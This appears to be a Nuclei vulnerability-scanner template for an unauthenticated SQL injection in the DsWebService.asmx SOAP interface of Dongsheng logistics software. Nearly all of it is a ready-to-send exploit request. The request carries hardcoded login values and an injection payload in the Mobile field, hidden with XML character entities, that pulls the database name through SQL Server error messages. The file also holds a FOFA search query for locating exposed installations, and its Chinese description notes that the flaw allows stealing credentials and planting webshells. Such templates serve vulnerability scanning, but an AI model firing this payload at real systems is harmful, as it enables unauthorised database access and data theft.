common/config/pocs/nuclei-2025/东胜物流软件-DsWebService.asmx-SQL注入漏洞.yaml

http:
    - matchers:
        - condition: and
          part: body
          type: word
          words:
            - 转换成数据类型 int 时失败
            - 在将 nvarchar 值
        - status:
            - 500
          type: status
      matchers-condition: and
      raw:
        - |
          POST /Webservice/DsWebService.asmx HTTP/1.1
          Host: {{Hostname}}
          Content-Type: application/soap+xml;charset=UTF-8;action="DsWebService/GetSeaiBsDataList"

          <soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope" xmlns:dsw="DsWebService">
             <soap:Header/>
             <soap:Body>
                <dsw:GetSeaiBsDataList>
                   <!--Optional:-->
                   <dsw:LoginName>qdtaize</dsw:LoginName>
                   <!--Optional:-->
                   <dsw:LoginPass>EBBE3242-D49E-4398-BBFE-0133CA655EB5</dsw:LoginPass>
                   <!--Optional:-->
                   <dsw:Mobile>&#x31;&#x27;&#x29;&#x20;&#x4f;&#x52;&#x20;&#x31;&#x3d;&#x28;&#x53;&#x45;&#x4c;&#x45;&#x43;&#x54;&#x20;&#x54;&#x4f;&#x50;&#x20;&#x31;&#x20;&#x44;&#x42;&#x5f;&#x4e;&#x41;&#x4d;&#x45;&#x28;&#x29;&#x29;&#x20;&#x2d;&#x2d;&#x20;</dsw:Mobile>
                   <!--Optional:-->
                   <dsw:Mblno>1</dsw:Mblno>
                   <dsw:start>1</dsw:start>
                   <dsw:limit>1</dsw:limit>
                </dsw:GetSeaiBsDataList>
             </soap:Body>
          </soap:Envelope>
id: dongshengwuliu-DsWebService_asmx-sql
info:
    author: Superhero
    description: |-
        fofa: body="FeeCodes/CompanysAdapter.aspx" || body="dhtmlxcombo_whp.js" || body="dongshengsoft" || body="theme/dhtmlxcombo.css"
        东胜物流软件 DsWebService.asmx 接口存在SQL注入漏洞,未经身份验证的远程攻击者除了可以利用 SQL注入漏洞获取数据库中的信息(例如，管理员后台密码、站点的用户个人信息)之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。
    name: 东胜物流软件 DsWebService.asmx SQL注入漏洞
    reference:
        - https://mp.weixin.qq.com/s/tiEV8NdyhAY5Z_Pf-Jod5w
    severity: high
    tags:
        - 东胜物流软件
